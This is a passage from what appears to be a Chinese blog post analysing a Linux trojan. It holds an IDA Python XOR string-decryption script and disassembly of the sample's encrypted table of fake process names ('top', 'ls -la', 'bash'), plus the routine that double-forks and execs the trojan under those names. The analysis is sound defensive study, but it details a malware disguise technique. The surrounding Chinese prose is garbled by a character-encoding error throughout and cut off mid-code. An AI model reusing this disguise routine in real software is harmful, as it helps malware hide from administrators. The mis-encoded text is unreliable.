class="hljs-built_in">chr</span>(Byte(addr))<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">break</span><br>    addr += <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> out<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data</span>):<br><br>  xorkey = <span class="hljs-string">&#x27;BB2FA36AAA9541F0&#x27;</span><br>  length = <span class="hljs-built_in">len</span>(data)<br>  o = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">if</span> length &gt; <span class="hljs-number">0</span>:<br>    v2 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> v2 &lt; length:<br>      o += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(data[v2]) ^  <span class="hljs-built_in">ord</span>(xorkey[((v2 + ((v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)) &amp; <span class="hljs-number">0xF</span>) - ( (v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)]) )<br>      v2 += <span class="hljs-number">1</span><br><br>  <span class="hljs-keyword">return</span> o<br><br>ea = ScreenEA()<br>string = get_string(ea)<br>dec = decrypt(string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Addr: 0x%x, %s&#x27;</span> % (ea, dec)<br>MakeComm(ea, dec)<br></code></pre></td></tr></table></figure><p>å¤„ç†åå¯ä»¥çœ‹åˆ°ä¼ªè£…çš„å‘½ä»¤è¡Œä¿¡æ¯ï¼Œdaemonnameã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:080CBB40 daemonname      db &#x27;!#Ff3VE.-7&#x27;,17h,&#x27;V[_ 0&#x27;,0 ; DATA XREF: main+31Eo<br>.data:080CBB40                                         ; main+4AEo ...<br>.data:080CBB40                                         ; cat resolv.conf<br>.data:080CBB51                 align 4<br>.data:080CBB54 a12             db &#x27;1*2&#x27;,0              ; sh<br>.data:080CBB58                 db    0<br>.data:080CBB59                 db    0<br>.data:080CBB5A                 db    0<br>.data:080CBB5B                 db    0<br>.data:080CBB5C                 db    0<br>.data:080CBB5D                 db    0<br>.data:080CBB5E                 db    0<br>.data:080CBB5F                 db    0<br>.data:080CBB60                 db    0<br>.data:080CBB61                 db    0<br>.data:080CBB62                 db    0<br>.data:080CBB63                 db    0<br>.data:080CBB64                 db    0<br>.data:080CBB65                 db    0<br>.data:080CBB66                 db    0<br>.data:080CBB67                 db    0<br>.data:080CBB68                 db  20h                 ; bash<br>.data:080CBB69                 db  23h ; #<br>.data:080CBB6A                 db  41h ; A<br>.data:080CBB6B                 db  2Eh ; .<br>.data:080CBB6C                 db  41h ; A<br>.data:080CBB6D                 db    0<br>.data:080CBB6E                 db    0<br>.data:080CBB6F                 db    0<br>.data:080CBB70                 db    0<br>.data:080CBB71                 db    0<br><br>...<br><br>.data:080CBBB8                 db  2Eh ; .             ; ls -la<br>.data:080CBBB9                 db  31h ; 1<br>.data:080CBBBA                 db  12h<br>.data:080CBBBB                 db  6Bh ; k<br>.data:080CBBBC                 db  2Dh ; -<br>.data:080CBBBD                 db  52h ; R<br>.data:080CBBBE                 db  36h ; 6<br>.data:080CBBBF                 db    0<br>.data:080CBBC0                 db    0<br>.data:080CBBC1                 db    0<br>.data:080CBBC2                 db    0<br>.data:080CBBC3                 db    0<br>.data:080CBBC4                 db    0<br>.data:080CBBC5                 db    0<br>.data:080CBBC6                 db    0<br>.data:080CBBC7                 db    0<br>.data:080CBBC8                 db    0<br>.data:080CBBC9                 db    0<br>.data:080CBBCA                 db    0<br>.data:080CBBCB                 db    0<br>.data:080CBBCC                 db  36h ; 6             ; top<br>.data:080CBBCD                 db  2Dh ; -<br>.data:080CBBCE                 db  42h ; B<br>.data:080CBBCF                 db  46h ; F<br>.data:080CBBD0                 db    0<br>.data:080CBBD1                 db    0<br>.data:080CBBD2                 db    0<br><br>...<br></code></pre></td></tr></table></figure><p>å‘µå‘µï¼Œå·²ç»çœ‹åˆ° topï¼Œ ls -al ç­‰ä¿¡æ¯äº†ï¼ŒæŸ¥çœ‹daemonname çš„äº¤å‰å¼•ç”¨ï¼Œå‘ç°åœ¨mainå‡½æ•°<br>ä¸­ï¼Œåˆ°mainé‡Œçœ‹çœ‹ã€‚</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">0804</span>AC30 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:<span class="hljs-number">0804</span>AC30                 public main<br>.text:<span class="hljs-number">0804</span>AC30 main            <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> DATA</span> XREF:<span class="hljs-title"> _start+17o</span><br><br>....<br><br>.text:0804AF4E<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> offset<span class="hljs-title"> daemonname</span> ; &quot;!#Ff3VE.-7\x17V[_ 0&quot;<br><br>...<br><br>.text:0804AFC2<span class="hljs-title"> loc_804AFC2:</span>                            ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> main+3ABj</span><br>.text:0804AFC2<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> ebx</span><br>.text:0804AFC5<span class="hljs-title">                 add</span> <span class="hljs-title">    ebx,</span> 14h<br>.text:0804AFC8<span class="hljs-title">                 mov</span> <span class="hljs-title">    dword</span> ptr [esp+4], 14h<br>.text:0804AFD0<span class="hljs-title">                 call</span> <span class="hljs-title">   encrypt_code</span><br>.text:0804AFD5<span class="hljs-title">                 cmp</span> <span class="hljs-title">    ebx,</span> offset<span class="hljs-title"> unk_80CBD0C</span><br>.text:0804AFDB<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> loc_804AFC2<br></code></pre></td></tr></table></figure><p>è¿™æ®µæ±‡ç¼–ä»£ç ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå¾ªç¯ï¼Œè°ƒç”¨encrypt_code å¯¹daemonnameè¿›è¡Œäº†è§£å¯†ã€‚<br>åé¢çš„ä»£ç ï¼Œç”¨åˆ°äº†daemonnameçš„åœ°æ–¹æœ‰ä¸‹é¢å‡ å¤„ï¼Œ</p><p>ç¬¬ä¸€å¤„</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804B29F                 <span class="hljs-keyword">call</span>    getpid<br><span class="hljs-symbol">.text:</span>0804B2A4                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], (offset <span class="hljs-keyword">aDD</span>+<span class="hljs-number">3</span>) <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span>0804B2AC                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br><span class="hljs-symbol">.text:</span>0804B2B4                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span>             ï¼›ç¬¬ä¸‰å½¢å‚ pid<br><span class="hljs-symbol">.text:</span>0804B2B7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">0Ch</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804B2BB                 <span class="hljs-keyword">call</span>    snprintf<br><span class="hljs-symbol">.text:</span>0804B2C0                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">17h</span><br><span class="hljs-symbol">.text:</span>0804B2C8                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B2CF                 <span class="hljs-keyword">call</span>    randomid<br><span class="hljs-symbol">.text:</span>0804B2D4                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804B2D8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">edi</span>             ï¼›ç¬¬ä¸€å½¢å‚ è¦è·‘çš„æœ¨é©¬<br><span class="hljs-symbol">.text:</span>0804B2DB                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ax</span><br><span class="hljs-symbol">.text:</span>0804B2DE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span>0804B2E1                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, daemonname[<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>] <span class="hljs-comment">; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="hljs-symbol">.text:</span>0804B2E8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span>           <span class="hljs-comment">; ç¬¬äºŒå½¢å‚  daemonname</span><br><span class="hljs-symbol">.text:</span>0804B2EC                 <span class="hljs-keyword">call</span>    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0804B932</span>                 lea     edx, [ebp+var_1888]<br>.text:<span class="hljs-number">0804B938</span>                 add     ebx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0804B93B</span>                 mov     [esp], edx<br>.text:<span class="hljs-number">0804B93E</span>                 call    randmd5<br>.text:<span class="hljs-number">0804B943</span>                 mov     [ebp+var_22], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B94A</span>                 mov     [ebp+var_1E], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B951</span>                 mov     [ebp+var_1A], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B957</span>                 call    getpid<br>.text:<span class="hljs-number">0804B95C</span>                 mov     dword ptr [esp+<span class="hljs-number">8</span>], (offset aDD+<span class="hljs-number">3</span>) ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0804B964</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br>.text:<span class="hljs-number">0804B96C</span>                 mov     [esp], esi<br>.text:<span class="hljs-number">0804B96F</span>                 mov     [esp+<span class="hljs-number">0Ch</span>], eax<br>.text:<span class="hljs-number">0804B973</span>                 call    snprintf<br>.text:<span class="hljs-number">0804B978</span>                 mov     dword ptr [esp+<span class="hljs-number">4</span>], 17h<br>.text:<span class="hljs-number">0804B980</span>                 mov     dword ptr [esp], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0804B987</span>                 call    randomid<br>.text:<span class="hljs-number">0804B98C</span>                 mov     [esp+<span class="hljs-number">8</span>], esi<br>.text:<span class="hljs-number">0804B990</span>                 movzx   eax, ax<br>.text:<span class="hljs-number">0804B993</span>                 lea     eax, [eax+eax*<span class="hljs-number">4</span>]<br>.text:<span class="hljs-number">0804B996</span>                 lea     eax, daemonname[eax*<span class="hljs-number">4</span>] ; <span class="hljs-string">&quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br>.text:<span class="hljs-number">0804B99D</span>                 mov     [esp+<span class="hljs-number">4</span>], eax<br>.text:<span class="hljs-number">0804B9A1</span>                 lea     eax, [ebp+var_1888]<br>.text:<span class="hljs-number">0804B9A7</span>                 mov     [esp], eax<br>.text:<span class="hljs-number">0804B9AA</span>                 call    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰å¤„</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804B9DF                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">ebp</span>+var_1C88]<br><span class="hljs-symbol">.text:</span>0804B9E5                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span>0804B9E8                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>0804B9EB                 <span class="hljs-keyword">call</span>    randmd5<br><span class="hljs-symbol">.text:</span>0804B9F0                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_22], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B9F7                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_1E], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804B9FE                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+var_1A], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804BA04                 <span class="hljs-keyword">call</span>    getpid<br><span class="hljs-symbol">.text:</span>0804BA09                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], (offset <span class="hljs-keyword">aDD</span>+<span class="hljs-number">3</span>) <span class="hljs-comment">; &quot;%d&quot;</span><br><span class="hljs-symbol">.text:</span>0804BA11                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">0Ah</span><br><span class="hljs-symbol">.text:</span>0804BA19                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804BA1C                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">0Ch</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA20                 <span class="hljs-keyword">call</span>    snprintf<br><span class="hljs-symbol">.text:</span>0804BA25                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-number">17h</span><br><span class="hljs-symbol">.text:</span>0804BA2D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0804BA34                 <span class="hljs-keyword">call</span>    randomid<br><span class="hljs-symbol">.text:</span>0804BA39                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">8</span>], <span class="hljs-built_in">esi</span><br><span class="hljs-symbol">.text:</span>0804BA3D                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">ax</span><br><span class="hljs-symbol">.text:</span>0804BA40                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>]<br><span class="hljs-symbol">.text:</span>0804BA43                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, daemonname[<span class="hljs-built_in">eax</span>*<span class="hljs-number">4</span>] <span class="hljs-comment">; &quot;!#Ff3VE.-7\x17V[_ 0&quot;</span><br><span class="hljs-symbol">.text:</span>0804BA4A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA4E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>+var_1C88]<br><span class="hljs-symbol">.text:</span>0804BA54                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0804BA57                 <span class="hljs-keyword">call</span>    LinuxExec_Argv2<br></code></pre></td></tr></table></figure><p>éƒ½æ˜¯ä½œä¸ºLinuxExec_Argv2 å‚æ•°ä½¿ç”¨çš„ï¼Œæ¥ç€æ¥çœ‹LinuxExec_Argv2 çš„ä»£ç </p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">08048520</span> LinuxExec_Argv2 <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> DelService+B3p</span><br>.text:08048520                                         ;<span class="hljs-title"> DelService+CBlp</span> ...<br>.text:08048520<br>.text:08048520<span class="hljs-title"> argv</span>            =<span class="hljs-title"> dword</span> ptr -18h<br>.text:08048520<span class="hljs-title"> var_14</span>          =<span class="hljs-title"> dword</span> ptr -14h<br>.text:08048520<span class="hljs-title"> var_10</span>          =<span class="hljs-title"> dword</span> ptr -10h<br>.text:08048520<span class="hljs-title"> var_C</span>           =<span class="hljs-title"> dword</span> ptr -0Ch<br>.text:08048520<span class="hljs-title"> var_8</span>           =<span class="hljs-title"> dword</span> ptr -8<br>.text:08048520<span class="hljs-title"> var_4</span>           =<span class="hljs-title"> dword</span> ptr -4<br>.text:08048520<span class="hljs-title"> file</span>            =<span class="hljs-title"> dword</span> ptr  8<br>.text:08048520<span class="hljs-title"> arg_4</span>           =<span class="hljs-title"> dword</span> ptr  0Ch<br>.text:08048520<span class="hljs-title"> arg_8</span>           =<span class="hljs-title"> dword</span> ptr  10h<br>.text:08048520<br>.text:08048520<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:08048521<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:08048523<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 28h<br>.text:08048526<span class="hljs-title">                 mov</span>     [ebp+var_4],<span class="hljs-title"> esi</span><br>.text:08048529<span class="hljs-title">                 mov</span> <span class="hljs-title">    esi,</span> [ebp+file]<br>.text:0804852C<span class="hljs-title">                 mov</span>     [ebp+var_8],<span class="hljs-title"> ebx</span><br>.text:0804852F<span class="hljs-title">                 mov</span>     [ebp+argv], 0<br>.text:08048536<span class="hljs-title">                 mov</span>     [ebp+var_14], 0<br>.text:0804853D<span class="hljs-title">                 mov</span>     [ebp+var_10], 0<br>.text:08048544<span class="hljs-title">                 mov</span>     [ebp+var_C], 0<br>.text:0804854B<span class="hljs-title">                 call</span> <span class="hljs-title">   doublefork</span><br>.text:08048550<span class="hljs-title">                 test</span> <span class="hljs-title">   eax,</span> eax<br>.text:08048552<span class="hljs-title">                 jz</span> <span class="hljs-title">     short</span> ZERO<br>.text:08048554<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> [ebp+var_8]<br>.text:08048557<span class="hljs-title">                 mov</span> <span class="hljs-title">    esi,</span> [ebp+var_4]<br>.text:0804855A<span class="hljs-title">                 mov</span> <span class="hljs-title">    esp,</span> ebp<br>.text:0804855C<span class="hljs-title">                 pop</span> <span class="hljs-title">    ebp</span><br>.text:0804855D<span class="hljs-title">                 retn</span><br>.text:0804855E ; ---------------------------------------------------------------------------<br>.text:0804855E<br>.text:0804855E<span class="hljs-title"> ZERO:</span>                                   ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> LinuxExec_Argv2+32j</span><br>.text:0804855E<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebx,</span> 3<br>.text:08048563<br>.text:08048563<span class="hljs-title"> LOOP:</span>                                   ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> LinuxExec_Argv2+54j</span><br>.text:08048563<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> ebx</span>      ;<span class="hljs-title"> fd</span><br>.text:08048566<span class="hljs-title">                 add</span> <span class="hljs-title">    ebx,</span> 1<br>.text:08048569<span class="hljs-title">                 call</span> <span class="hljs-title">   close</span><br>.text:0804856E<span class="hljs-title">                 cmp</span> <span class="hljs-title">    ebx,</span> 400h       ï¼›400h == 1024<br>.text:08048574<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> LOOP<br>.text:08048576<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_4]<br>.text:08048579<span class="hljs-title">                 mov</span>     [ebp+argv],<span class="hljs-title"> esi</span><br>.text:0804857C<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> esi</span>      ;<span class="hljs-title"> file</span><br>.text:0804857F<span class="hljs-title">                 mov</span>     [ebp+var_14],<span class="hljs-title"> eax</span><br>.text:08048582<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_8]ï¼›eax =<span class="hljs-title"> pid</span><br>.text:08048585<span class="hljs-title">                 mov</span>     [ebp+var_10],<span class="hljs-title"> eax</span><br>.text:08048588<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [ebp+argv]<br>.text:0804858B<span class="hljs-title">                 mov</span>     [esp+4],<span class="hljs-title"> eax</span>    ;<span class="hljs-title"> argv</span><br>.text:0804858F<span class="hljs-title">                 call</span> <span class="hljs-title">   execvp</span><br>.text:08048594<span class="hljs-title">                 mov</span> <span class="hljs-title">    dword</span> ptr [esp], 0 ;<span class="hljs-title"> status</span><br>.text:0804859B<span class="hljs-title">                 call</span> <span class="hljs-title">   exit</span><br>.text:0804859B<span class="hljs-title"> LinuxExec_Argv2</span> endp<br></code></pre></td></tr></table></figure><p>LinuxExec_Argv2 æœ‰ä¸‰ä¸ªå‚æ•°ã€‚æœ€ç»ˆæ‰§è¡Œäº†execvp</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804857C                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>], <span class="hljs-built_in">esi</span>      <span class="hljs-comment">; file </span><br>...<br><span class="hljs-symbol">.text:</span>0804858B                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">4</span>], <span class="hljs-built_in">eax</span>    <span class="hljs-comment">; argv</span><br><span class="hljs-symbol">.text:</span>0804858F                 <span class="hljs-keyword">call</span>    execvp<br></code></pre></td></tr></table></figure><p>ä¼ªä»£ç ä¸ºï¼Œ</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">execvp(<span class="hljs-name">file</span>, <span class="hljs-symbol">&amp;argv</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>file å°±æ˜¯arg_0, éœ€è¦åˆ†æargvï¼Œ è°ƒå‡ºæ ˆå›¾å°±æ¯”è¾ƒæ¸…æ™°äº†ã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-00000018 argv            dd ?                    ; offset</span><br><span class="hljs-deletion">-00000014 var_14          dd ?</span><br><span class="hljs-deletion">-00000010 var_10          dd ?</span><br><span class="hljs-deletion">-0000000C var_C           dd ?</span><br><span class="hljs-deletion">-00000008 var_8           dd ?</span><br><span class="hljs-deletion">-00000004 var_4           dd ?</span><br><span class="hljs-addition">+00000000  s              db 4 dup(?)</span><br><span class="hljs-addition">+00000004  r              db 4 dup(?)</span><br><span class="hljs-addition">+00000008 file            dd ?                    ; offset</span><br><span class="hljs-addition">+0000000C arg_4           dd ?</span><br><span class="hljs-addition">+00000010 arg_8           dd ?</span><br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯è¿™å¥</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048529</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, [<span class="hljs-built_in">ebp</span>+file]<br>...<br><span class="hljs-symbol">.text:</span>0804852F                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span class="hljs-number">0</span><br>...<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048579</span>                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">ebp</span>+argv], <span 